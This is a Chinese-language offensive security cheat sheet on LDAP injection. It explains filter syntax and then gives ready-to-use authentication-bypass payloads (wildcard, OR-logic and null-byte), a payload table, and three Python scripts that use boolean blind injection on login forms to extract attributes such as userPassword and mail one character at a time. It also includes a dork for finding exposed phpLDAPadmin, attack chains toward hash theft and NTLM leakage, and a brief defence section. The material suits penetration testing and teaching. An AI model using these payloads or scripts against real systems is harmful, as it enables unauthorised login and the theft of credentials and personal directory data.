---
attack_surface: [注入类]
impact: [身份伪造, 权限提升, 信息泄露]
risk_level: 高
prerequisites:
  - LDAP 协议基础
  - LDAP Filter 语法 (Bachus-Naur Form)
  - 目录服务概念 (DN, CN, OU, DC)
difficulty: 中级
related_techniques:
  - sql-injection
  - nosql-injection
  - orm-injection
  - xpath-injection
  - rsql-injection
  - ssrf-server-side-request-forgery
tools:
  - Burp Suite
  - curl
  - ldapsearch
---

# LDAP Injection — 轻量目录服务注入

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [NoSQL Injection](../NoSQL%20Injection/README.md) · [XPATH Injection](../XPATH%20Injection/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 LDAP

LDAP（Lightweight Directory Access Protocol）是一种基于 X.500 标准的轻量级目录访问协议，广泛用于企业身份管理（如 Active Directory、OpenLDAP）。LDAP 使用特定的**过滤器语法（Filter Syntax）**进行查询，语法遵循 RFC 4515 定义的 Bachus-Naur Form（BNF）。

## 1.2 为什么会发生

当应用将用户输入直接拼接到 LDAP 过滤器字符串中而未进行过滤时，攻击者可以**修改过滤器逻辑**，绕过认证或提取未授权信息。

```python
# 漏洞代码
filter_str = f"(&(uid={username})(userPassword={password}))"
ldap.search(filter_str)
# 若 username = "*"，则过滤器变为：
# (&(uid=*)(userPassword=xxx))
# uid=* 匹配任意 uid → 可绕过认证
```

**根因**：LDAP 过滤器是字符串拼接的，而 `*` 是 LDAP 的通配符，`()` 和 `&`/`|` 是逻辑运算符。攻击者通过注入这些特殊字符改变过滤器语义。

---

# 0x02 LDAP Filter 语法速查

## 2.1 基本语法 (BNF)

| 元素 | 语法 | 说明 |
|------|------|------|
| **AND** | `(&(cond1)(cond2))` | 所有条件为真 |
| **OR** | `(\|(cond1)(cond2))` | 任一条件为真 |
| **NOT** | `(!(cond))` | 条件为假 |
| **相等** | `(attr=value)` | 属性匹配 |
| **通配** | `(attr=*value*)` | 模糊匹配 |
| **比较** | `(attr>=value)` / `(attr<=value)` | 范围匹配 |
| **近似** | `(attr~=value)` | 近似匹配 |
| **存在** | `(attr=*)` | 属性存在 |

## 2.2 原型过滤器示例

```ldap
# 登录验证
(&(uid=admin)(userPassword=secret))

# 组成员检查
(&(objectClass=person)(memberOf=cn=admin,ou=groups,dc=com))

# 用户搜索
(|(cn=John*)(sn=Doe*))
```

---

# 0x03 认证绕过

## 3.1 通配符注入

LDAP 中 `*` 匹配任意字符串。如果用户名/密码字段可注入 `*`：

```ldap
# 原始过滤器
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))

# 用户名注入 * → 匹配任意 uid
(&(uid=*)(userPassword=xxx))
# → 若密码非空且某 uid 的密码匹配 xxx → 登录成功

# 更危险：两个字段都注入 *
(&(uid=*)(userPassword=*))
# → 匹配任意两个属性均存在的条目 → 以第一匹配用户身份登录
```

## 3.2 逻辑运算符注入 (OR Bypass)

通过注入 `)` 提前闭合条件，再注入 `|` 引入 OR 使其永远为真：

```ldap
# Payload 1: 闭合 uid 条件后添加 OR 真值
username = "admin)(|(uid=admin"
password = "xxx)"
# 结果: (&(uid=admin)(|(uid=admin)(userPassword=xxx))
#     ^ uid=admin ✓  AND  (uid=admin ✓ OR pass=xxx ?) → 整体为真

# Payload 2: 使用永真条件
username = "*)(uid=*))(|(uid=*"
password = "xxx"
# 结果: (&(uid=*)(uid=*))(|(uid=*)(userPassword=xxx))

# Payload 3: 最简洁 OR bypass（双 OR 模式）
username = "*)(|(uid=*"
password = "xxx)"
# → (&(uid=*)(|(uid=*)(userPassword=xxx))
```

**经典 Payload 表**：

| Payload | 效果 |
|---------|------|
| `*` | 通配任意值 |
| `*)(uid=*))(\|(uid=*` | 双 OR 构造永真 |
| `*)(\|(&` | 注入 OR + AND 结构 |
| `admin)(\|(objectClass=*))` | 以 admin 身份绕过 + OR 永真 |
| `*` `)(&` | null injection（仅部分实现） |

## 3.3 LDAP Null Injection

某些 LDAP 实现将 NULL 字节 `%00` 视为过滤器终止符：

```
username = "admin%00"
password = "anything"
# 过滤器: (&(uid=admin\0)(userPassword=anything))
# → 某些实现只解析到 \0 前的部分 → uid=admin 匹配即可
```

> **注意**：Null Injection 在现代 LDAP 实现中较少见（Java LDAP 库通常拒绝 NULL 字节），但盲测时仍值得尝试。

---

# 0x04 盲注提取数据

## 4.1 基于布尔盲注的字符提取

当应用对认证成功/失败返回不同响应时，可以利用布尔盲注逐字符提取属性值：

```python
import requests, string

def ldap_blind_extract(attr, url):
    """通过 LDAP 盲注逐字符提取属性值"""
    result = ""
    charset = string.ascii_letters + string.digits + "{}_@."
    for pos in range(1, 50):
        found = False
        for ch in charset:
            # 构造过滤器: (attr[pos]=ch)
            payload = f"*)({attr}={result}{ch}*"
            data = {"username": payload, "password": "x"}
            r = requests.post(url, data=data)
            if "Login successful" in r.text or "Welcome" in r.text:
                result += ch
                print(f"[+] {attr}: {result}")
                found = True
                break
        if not found:
            break
    return result
```

## 4.2 使用子串函数

部分 LDAP 实现（如 OpenLDAP）支持在过滤器中使用子串匹配：

```ldap
# 检查 description 属性的第 1 个字符是否为 'a'
(&(uid=admin)(description=a*))

# 检查 attributes 中第一个字符
# 结合 substring 逐个枚举
```

## 4.3 不同 LDAP 实现差异

| 实现 | 特殊字符 | 通配支持 | 子串函数 |
|------|---------|---------|---------|
| **OpenLDAP** | `*`, `(`, `)`, `\`, `NUL` | ✓ 完全支持 | ✓ |
| **ADAM (AD LDS)** | 同上 | ✓ | 部分 |
| **SunOne / Oracle** | 同上 + `&`, `\|` | ✓ | ✓ |

---

## 4.4 LDAP 属性发现与枚举

LDAP 对象默认包含大量内置属性，可暴力枚举所有属性提取信息：

```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber",
    "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile",
    "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn",
    "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes:  # 遍历每个属性
    value = ""
    finish = False
    while not finish:
        for char in alphabet:  # 逐字符测试
            query = f"*)({attribute}={value}{char}*"
            data = {'login': query, 'password': 'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            # sleep(0.5)  # 防暴力破解封禁
            if "Cannot login" in r.text:
                value += str(char)
                break
            if char == alphabet[-1]:  # 字符集末尾 → 值已到结尾
                finish = True
                print()
```

## 4.5 特殊盲注 (不依赖 `*` 通配符)

部分 LDAP 实现限制 `*` 通配符时，使用子串匹配逐字符提取：

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

---

# 0x05 自动化工具

```bash
# ldapsearch 手动测试
ldapsearch -x -H ldap://target -D "cn=admin,dc=com" -w pass -b "dc=com" "(uid=*)"

# Python 盲注脚本（参考 4.1 节）

# Burp Intruder + Grep-Extract 进行布尔盲注
```

## 5.1 Fuzz 字典

| 字典 | 用途 | 链接 |
|------|------|------|
| **LDAP_FUZZ.txt** | LDAP 注入 Payload 字典 | [GitHub](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt) |
| **LDAP_attributes.txt** | LDAP 默认属性名字典 | [GitHub](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) |
| **PosixAccount Attributes** | LDAP Schema 属性参考 | [tldp.org](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html) |

## 5.2 Google Dorks

```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```

---

# 0x06 攻击链与联动

## 6.1 LDAP 认证绕过 → 权限提升

```
[LDAP 注入绕过登录] → [以高权限用户身份登录]
    → [获取 LDAP 目录浏览权限] → [提取所有用户密码哈希]
    → [可能的 Kerberos/Golden Ticket 后续攻击]
```

## 6.2 LDAP → SSRF 联动

如果 LDAP 服务本身存在配置缺陷（如允许引用外部目录），可能联动 SSRF：

```
[LDAP Injection] → [注入引用 URL 的 DN]
    → [LDAP 服务器跟随引用 → 向攻击者服务器发起连接]
    → [可能泄露内部 NTLM 哈希 (Responder)]
```

---

# 0x07 防御策略

1. **对所有用户输入进行特殊字符转义**（RFC 4515 §3.2）：
   ```python
   def ldap_escape(value):
       """转义 LDAP 过滤器中的特殊字符"""
       escaped = value.replace('\\', '\\5c')
       for ch in ['*', '(', ')', '\0']:
           escaped = escaped.replace(ch, f'\\{ord(ch):02x}')
       return escaped
   ```

2. **使用参数化 LDAP 查询**（如 Java 的 `com.unboundid.ldap.sdk.Filter` 类）

3. **白名单验证** — 如果 `username` 只允许字母和数字，拒绝任何包含 `*()\|&!` 的输入

4. **最小权限原则** — LDAP bind 账户只授予必要的读取权限

5. **启用 LDAP 审计日志** — 记录所有 LDAP 查询供异常检测

---

# 0x08 参考资料

- [PayloadsAllTheThings — LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
- [OWASP — LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [LDAPWiki — LDAP Filters](https://ldapwiki.com/wiki/Wiki.jsp?page=LDAP%20filters%20Syntax%20and%20Choices)
- [RFC 4515 — LDAP: String Representation of Search Filters](https://tools.ietf.org/html/rfc4515)
- [HackTricks — LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)
- [Blackhat Europe 2008 — LDAP Injection & Blind LDAP Injection (PDF)](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
- [LDAP Fuzz Payload 字典](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt)
- [LDAP 默认属性字典](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
- [LDAP Implementation HOWTO — Schema 参考](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)
